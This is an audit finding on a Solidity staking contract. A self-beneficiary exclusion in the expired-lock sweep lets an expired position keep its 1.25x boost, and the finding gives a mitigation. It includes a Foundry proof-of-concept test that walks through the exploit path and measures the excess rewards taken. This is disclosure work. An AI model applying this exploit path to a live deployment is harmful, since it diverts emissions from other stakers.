# Self-Beneficiary exclusion in _sweepExpiredLocks allows expired boost to persist and misallocate rewards

## Severity: Medium

## Summary

The v3.1 locker-maintenance mechanism can fail to normalize an expired position when the expired locker is also the user carrying the maintenance transaction.

`_autoMaintain()` passes the transaction beneficiary into `_sweepExpiredLocks()`. The locker sweeps only processes an expired locker when `who != beneficiary`:

```solidity
address who = _lockers[idx];
UserInfo storage w = users[who];

...

} else if (who != beneficiary && block.timestamp >= w.unlockTime) {
    try this.lockStep(who, beneficiary) {
        unchecked { ++acted; }
    } catch {
        unchecked { ++_lockCursor; ++n; }
    }
} else {
    unchecked { ++_lockCursor; ++n; }
}
```

Here:

* `who` is the locker currently selected by the global `_lockCursor`.
* `beneficiary` is the user whose transaction carries `_autoMaintain()`.

For example, Alice can call:

```solidity
pokeExpiredLock(Bob);
```

which ultimately carries maintenance as Alice:

```solidity
_autoMaintain(msg.sender);
```

and therefore:

```text
beneficiary = Alice
```

If the global locker cursor encounters Alice during this maintenance pass:

```text
who         = Alice
beneficiary = Alice

who != beneficiary
Alice != Alice  -> false
```

Alice is therefore rotated past even if:

```solidity
block.timestamp >= users[Alice].unlockTime
```

Her position is not resynchronized and her historical boosted contribution remains in `totalBoostedEffective` and `totalBoostedPure`.

This creates a bypass of the propagation side of the BP-2026-001 remediation. The clock-aware derivation correctly recognizes the expiration; for example, the PoC observes:

```text
effectiveLockDaysOf(Alice) = 0
effectiveBoostOf(Alice)    = 10000 // 1.00x
```

while the stored accounting simultaneously remains stale:

```text
hasStaleBoost(Alice)       = true
isTrackedLocker(Alice)     = true
```

**This issue arises from the BP-2026-001 remediation itself: v3.1 introduced the rotating `_lockers` propagation sweep to normalize expired pure-staker weight automatically, but the newly added `who != beneficiary` exclusion causes that remediation to skip the expired position when its owner carries the maintenance pass, reopening the same stale-boost yield-misallocation class through the remediation path.**


### Exploit path:

- Alice deposits 1,000,000 BZPX for 730 days, giving her a 1.25x boost and 1,250,000 BZPX of tracked reward weight. After expiry, her valid boost becomes 1.00x, but the historical 1.25x contribution remains until the position is normalized.
- Alice then repeatedly calls `pokeExpiredLock()` on other expired lockers. Each call processes the targeted locker and subsequently runs autonomous maintenance with Alice as the beneficiary. Whenever the locker sweep reaches Alice, the `who != beneficiary` condition fails, so her expired position is skipped.
- The PoC drains all 40 other expired locker entries through Alice-carried maintenance while Alice remains the sole tracked expired locker:
```text
Alice poke transactions:  8
Remaining locker count:   1

Alice effective boost:    10000
Alice has stale boost:    true
Alice still tracked:      true
```

- This leaves Alice's historical 1.25x weight in the global denominators even though her commitment has expired:
```text
Alice correct 1.00x weight     = 1,000,000
Alice stale 1.25x weight       = 1,250,000
Normalized cohort baseline     =   400,000

Correct denominator            = 1,400,000
Actual stale denominator       = 1,650,000
```

The issue is specifically the self-beneficiary exclusion: a third party calling `pokeExpiredLock(Alice)` immediately normalizes the position and releases the stale 250,000 BZPX of excess weight.

## Impact

This is not limited to inconsistent bookkeeping. The passing PoC demonstrates that the stale weight changes Alice's **actual post-expiry emission allocation**.

A controlled one-day emission interval was allowed to elapse while Alice's clock-valid boost was 1.00x but her tracked weight remained at the historical 1.25x.

The table reports whole-BZPX values for readability. The PoC observes only a 499090 wei (~5×10⁻¹³ BZPX) difference between the accumulator-derived reward and the independently calculated stale-weight reward due to integer flooring, while the demonstrated excess allocation is approximately 3,049 BZPX.

| Metric               |  Correct state | Vulnerable state |
| -------------------- | -------------: | ---------------: |
| Alice stake          | 1,000,000 BZPX |   1,000,000 BZPX |
| Alice valid boost    |          1.00x |            1.00x |
| Alice tracked weight |      1,000,000 |    **1,250,000** |
| Other cohort weight  |        400,000 |          400,000 |
| Global denominator   |      1,400,000 |    **1,650,000** |
| One-day emission     |    70,450 BZPX |      70,450 BZPX |
| Alice reward         |   ~50,321 BZPX | **~53,371 BZPX** |
| Alice excess reward  |              — |  **~3,049 BZPX** |

The PoC output confirms:

```text
FINANCIAL IMPACT: 1 DAY AFTER EXPIRY

Interval emission:               70450

Alice VALID weight:            1000000
Alice TRACKED weight:          1250000

Alice correct reward @ 1.00x:    50321
Alice expected with stale 1.25x: 53371
Alice ACTUAL interval reward:    53371

EXCESS reward to Alice:           3049
```

Therefore Alice received approximately **3,049 BZPX more in a single controlled post-expiry day** than she would have received had her expired commitment been normalized correctly.


### Registry size affects persistence, but not the existence of the bug:
The PoC uses 41 lockers to deterministically demonstrate the self-skip and resulting reward misallocation. In production, persistence depends on subsequent maintenance activity and the rotating cursor. Alice's own maintenance transaction cannot normalize her when its sweep encounters her because `who == beneficiary`; however, a maintenance transaction carried by another user can normalize Alice when its window reaches her, and anyone can directly call `pokeExpiredLock(Alice)`. Larger registries and bounded scan widths can increase the time between organic opportunities to reach a particular locker, but the PoC does not claim that Alice can guarantee indefinite persistence.

The PoC additionally confirms that solvency is unaffected; the issue is reward/yield allocation rather than backing:

```solidity
assertTrue(staking.isSolvent());
assertEq(staking.auditInvariants() & 1, 0);
```

## Mitigation

Remove the `who != beneficiary` exclusion from the expired-lock processing condition.

```solidity
} else if (block.timestamp >= w.unlockTime) {
    try this.lockStep(who, beneficiary) {
        unchecked { ++acted; }
    } catch {
        unchecked { ++_lockCursor; ++n; }
    }
}
```

An expired commitment should be normalized based on its expiry state, irrespective of whether its owner happens to be the beneficiary carrying the maintenance transaction.

**Unlike liquidation maintenance, lock expiry normalization does not require protecting against a caller obtaining a liquidation bonus from processing their own position. The sweep should therefore be allowed to call `lockStep()` when:**

```text
who == beneficiary
```

as long as the position is expired.


## POC

Add this test to your test suite `Blaze-Phoenix-Staking/test/BlazePhoenixStaking.t.sol`

```solidity
    function test_Bug_SelfSkipInLockSweepCausesRewardMisallocation() public {
        vm.prank(admin);
        staking.fundEmission(100_000_000e18);

        uint256 aliceStake = 1_000_000e18;
        uint256 fodderStake = 10_000e18;
        uint256 n = 40;

        console2.log("");
        console2.log("============================================================");
        console2.log(" SELF-SKIP -> STALE BOOST -> REWARD MISALLOCATION");
        console2.log("============================================================");

        // Alice: 1,000,000 BZPX @ 730 days = 1.25x.
        vm.prank(alice);
        staking.deposit(aliceStake, 730);

        // Add 40 additional lockers so Alice can carry maintenance while
        // deliberately targeting positions other than herself.
        for (uint256 i; i < n; ++i) {
            address user = address(uint160(0x9000 + i));

            token.mint(user, fodderStake);

            vm.prank(user);
            token.approve(address(staking), type(uint256).max);

            vm.prank(user);
            staking.deposit(fodderStake, 730);
        }

        vm.roll(block.number + 11);

        uint256 boostBps = staking.boostByDays(730);
        uint256 aliceHistoricalWeight = aliceStake * boostBps / 10_000;

        console2.log("");
        console2.log("--- INITIAL STATE ---");
        console2.log("Alice stake:                 ", aliceStake / 1e18);
        console2.log("Alice historical boost bps: ", boostBps);
        console2.log("Alice historical weight:    ", aliceHistoricalWeight / 1e18);
        console2.log("Locker count:                ", staking.activeLockerCount());
        console2.log("totalBoostedEffective:       ", staking.totalBoostedEffective() / 1e18);

        assertEq(boostBps, 12_500);
        assertEq(staking.activeLockerCount(), n + 1);

        // ---------------------------------------------------------------------
        // Expire every 730-day commitment.
        //
        // Clock-aware derivation immediately reports Alice at 1.00x, but the
        // stored/tracked denominator still contains her historical 1.25x until
        // propagation actually normalises her.
        // ---------------------------------------------------------------------

        vm.warp(block.timestamp + 731 days);
        vm.roll(block.number + 11);

        console2.log("");
        console2.log("--- AFTER LOCK EXPIRY ---");
        console2.log("Alice effective lock days:   ", staking.effectiveLockDaysOf(alice));
        console2.log("Alice valid boost bps:        ", staking.effectiveBoostOf(alice));
        console2.log("Alice has stale boost:        ", staking.hasStaleBoost(alice));
        console2.log("Alice still tracked:          ", staking.isTrackedLocker(alice));

        assertEq(staking.effectiveLockDaysOf(alice), 0, "Alice commitment is objectively expired");

        assertEq(staking.effectiveBoostOf(alice), 10_000, "Alice is economically entitled to only 1.00x");

        assertTrue(staking.hasStaleBoost(alice), "precondition: Alice retains historical tracked boost");

        // ---------------------------------------------------------------------
        // Alice repeatedly calls pokeExpiredLock() on OTHER expired lockers.
        //
        // Each call carries:
        //
        //   pokeExpiredLock(target)
        //        -> lockStep(target, Alice)
        //        -> _autoMaintain(Alice)
        //             -> _sweepExpiredLocks(Alice, ...)
        //
        // When the rotating cursor reaches Alice:
        //
        //      who         = Alice
        //      beneficiary = Alice
        //
        // Therefore `who != beneficiary` is false and Alice is rotated past
        // without normalisation.
        //
        // Drain every other expired locker. Alice should survive as the only
        // tracked expired commitment.
        // ---------------------------------------------------------------------

        uint256 pokeCount;

        while (staking.activeLockerCount() > 1 && pokeCount < 200) {
            (address[] memory live,) = staking.getLockers(0, 64);

            address target;

            for (uint256 i; i < live.length; ++i) {
                if (live[i] != alice) {
                    target = live[i];
                    break;
                }
            }

            assertTrue(target != address(0), "expected expired non-Alice target");

            vm.prank(alice);
            staking.pokeExpiredLock(target);

            vm.roll(block.number + 1);

            unchecked {
                ++pokeCount;
            }
        }

        // Normalised fodder remains staked, but only at baseline 1.00x.
        uint256 fodderBaseline = n * fodderStake; // 400,000

        // Alice SHOULD also be baseline after expiry.
        uint256 aliceCorrectWeight = aliceStake; // 1,000,000

        uint256 correctTotal = aliceCorrectWeight + fodderBaseline; // 1,400,000

        // Instead Alice remains tracked at historical 1.25x.
        uint256 staleTotal = aliceHistoricalWeight + fodderBaseline; // 1,650,000

        uint256 staleExcess = staleTotal - correctTotal; // 250,000

        console2.log("");
        console2.log("--- AFTER ALICE DRAINS OTHER EXPIRED LOCKERS ---");
        console2.log("Alice poke transactions:     ", pokeCount);
        console2.log("Remaining locker count:      ", staking.activeLockerCount());
        console2.log("Alice still tracked:          ", staking.isTrackedLocker(alice));
        console2.log("Alice valid boost bps:        ", staking.effectiveBoostOf(alice));
        console2.log("Alice has stale boost:        ", staking.hasStaleBoost(alice));

        console2.log("");
        console2.log("--- DENOMINATOR CORRUPTION ---");
        console2.log("Alice correct 1.00x weight:   ", aliceCorrectWeight / 1e18);
        console2.log("Alice stale 1.25x weight:     ", aliceHistoricalWeight / 1e18);
        console2.log("Alice unearned excess weight: ", staleExcess / 1e18);
        console2.log("Correct global denominator:   ", correctTotal / 1e18);
        console2.log("Actual global denominator:    ", staking.totalBoostedEffective() / 1e18);

        assertEq(staking.activeLockerCount(), 1, "Alice's own maintenance removed every other expired locker");

        assertTrue(staking.isTrackedLocker(alice), "BUG: Alice survives her own maintenance traffic");

        assertEq(staking.effectiveLockDaysOf(alice), 0, "Alice is objectively expired");

        assertEq(staking.effectiveBoostOf(alice), 10_000, "Alice's clock-valid multiplier is 1.00x");

        assertTrue(staking.hasStaleBoost(alice), "BUG: historical 1.25x contribution remains tracked");

        assertEq(aliceHistoricalWeight, 1_250_000e18);

        assertEq(correctTotal, 1_400_000e18);

        assertEq(staleTotal, 1_650_000e18);

        assertEq(staleExcess, 250_000e18);

        assertEq(
            staking.totalBoostedEffective(), staleTotal, "BUG: emission denominator contains Alice's expired excess"
        );

        assertEq(staking.totalBoostedPure(), staleTotal, "BUG: pure-yield denominator contains Alice's expired excess");

        // =====================================================================
        // FINANCIAL IMPACT
        //
        // We now measure a fresh post-expiry interval.
        //
        // IMPORTANT:
        //
        // pendingRewards(alice) already contains Alice's historical backlog.
        // Comparing pendingRewards before/after a warp is not reliable here
        // because the preview is derived from the accumulator/debt state.
        //
        // Instead:
        //
        //  1. Snapshot Alice's total economic entitlement:
        //         balance + pendingRewards
        //  2. Advance one day while Alice remains stale.
        //  3. Snapshot it again.
        // =====================================================================

        uint256 aliceEconomicBefore = token.balanceOf(alice) + staking.pendingRewards(alice);

        uint256 impactWindow = 1 days;

        vm.warp(block.timestamp + impactWindow);
        vm.roll(block.number + 1);

        uint256 aliceEconomicAfter = token.balanceOf(alice) + staking.pendingRewards(alice);

        uint256 aliceActualIntervalReward = aliceEconomicAfter - aliceEconomicBefore;

        /*
         * REWARD_PER_SEC is deterministic.
         *
         * During this interval:
         *
         * vulnerable accounting:
         *
         *      Alice = 1,250,000 / 1,650,000
         *
         * correct accounting:
         *
         *      Alice = 1,000,000 / 1,400,000
         */
        uint256 intervalEmission = staking.REWARD_PER_SEC() * impactWindow;

        uint256 aliceCorrectIntervalReward = intervalEmission * aliceCorrectWeight / correctTotal;

        uint256 aliceStaleExpectedReward = intervalEmission * aliceHistoricalWeight / staleTotal;

        uint256 excessReward = aliceActualIntervalReward - aliceCorrectIntervalReward;

        console2.log("");
        console2.log("============================================================");
        console2.log(" FINANCIAL IMPACT: 1 DAY AFTER EXPIRY");
        console2.log("============================================================");

        console2.log("Interval emission:            ", intervalEmission / 1e18);
        console2.log("Alice VALID weight:           ", aliceCorrectWeight / 1e18);
        console2.log("Alice TRACKED weight:         ", aliceHistoricalWeight / 1e18);

        console2.log("");
        console2.log("Alice correct reward @ 1.00x: ", aliceCorrectIntervalReward / 1e18);
        console2.log("Alice expected with stale 1.25x:", aliceStaleExpectedReward / 1e18);
        console2.log("Alice ACTUAL interval reward: ", aliceActualIntervalReward / 1e18);
        console2.log("EXCESS reward to Alice:       ", excessReward / 1e18);

        assertGt(
            aliceActualIntervalReward,
            aliceCorrectIntervalReward,
            "IMPACT: expired Alice earns more than her valid 1.00x entitlement"
        );

        uint256 roundingDelta = aliceActualIntervalReward > aliceStaleExpectedReward
            ? aliceActualIntervalReward - aliceStaleExpectedReward
            : aliceStaleExpectedReward - aliceActualIntervalReward;

        console2.log("Stale-formula rounding delta:  ", roundingDelta);

        assertApproxEqAbs(
            aliceActualIntervalReward,
            aliceStaleExpectedReward,
            1e6,
            "Alice's post-expiry reward follows stale 1.25x accounting"
        );

        assertGt(excessReward, 0, "stale weight transfers emission away from the remaining cohort");

        // Alice must STILL be stale after the vulnerable reward interval.
        assertTrue(staking.hasStaleBoost(alice), "Alice remains stale throughout the impact interval");

        assertEq(staking.totalBoostedEffective(), staleTotal, "stale denominator persists through reward interval");

        // =====================================================================
        // THIRD-PARTY CORRECTION
        //
        // Alice is not unprocessable. Carol can target her directly and
        // immediately remove exactly the 250,000 expired excess.
        //
        // This isolates the issue to Alice being excluded when she is the
        // beneficiary carrying the autonomous locker sweep.
        // =====================================================================

        uint256 aliceBalanceBeforeCorrection = token.balanceOf(alice);

        console2.log("Carol calls pokeExpiredLock(Alice)");

        vm.prank(carol);
        staking.pokeExpiredLock(alice);

        uint256 aliceBalanceAfterCorrection = token.balanceOf(alice);

        console2.log("Alice stale after Carol:      ", staking.hasStaleBoost(alice));
        console2.log("Alice tracked after Carol:    ", staking.isTrackedLocker(alice));
        console2.log("Corrected emission denom:     ", staking.totalBoostedEffective() / 1e18);
        console2.log("Corrected pure-yield denom:   ", staking.totalBoostedPure() / 1e18);
        console2.log("Released stale weight:        ", staleExcess / 1e18);
        console2.log(
            "Rewards settled to Alice:     ", (aliceBalanceAfterCorrection - aliceBalanceBeforeCorrection) / 1e18
        );

        assertFalse(staking.hasStaleBoost(alice), "third party immediately normalizes Alice");

        assertFalse(staking.isTrackedLocker(alice), "Alice is removed from locker registry");

        assertEq(
            staking.totalBoostedEffective(),
            correctTotal,
            "third-party processing restores correct emission denominator"
        );

        assertEq(
            staking.totalBoostedPure(), correctTotal, "third-party processing restores correct pure-yield denominator"
        );

        assertTrue(staking.isSolvent());
        assertEq(staking.auditInvariants() & 1, 0);
    }
```